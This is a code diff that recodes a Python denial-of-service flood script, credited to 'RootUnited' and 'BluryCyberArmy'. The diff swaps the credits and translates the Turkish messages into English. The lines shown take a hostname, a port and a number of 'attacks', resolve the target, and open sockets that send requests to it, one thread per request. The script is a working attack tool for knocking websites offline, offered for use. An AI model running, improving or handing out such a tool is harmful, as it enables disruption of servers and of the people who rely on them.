@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
 # Author : RootUnited
+# Recoded by : codex31
 # Moved from python2 to python3
-# All copyrights to BluryCyberArmy
+# All copyrights to Squnity team
 
 import random
 import socket
@@ -26,7 +27,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print ("HATA\n Kullanimi: " + sys.argv[0] + " < Domain/ip > < Port > < Gonderilecek Flood >")
+    print ("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -34,7 +35,7 @@ try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
     ip = socket.gethostbyname(host)
 except socket.gaierror:
-    print (" HATA\n Dogru bir web sitesi girdiginizden emin misiniz?")
+    print (" ERROR\n Make sure you entered a correct website")
     sys.exit(2)
 
 # Create a shared variable for thread counts
@@ -78,14 +79,14 @@ def attack():
         byt = msg.encode()
         dos.send(byt)
     except socket.error:
-        print ("\n [ Siteye baglanilmiyor, site coktu sanirim ]: " + str(socket.error))
+        print ("\n [ No connection, server may be down ]: " + str(socket.error))
     finally:
         # Close our socket gracefully
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
 
-print ("[#] Saldiri Basladi " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
+print ("[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
 
 # Spawn a thread per request
 all_threads = []
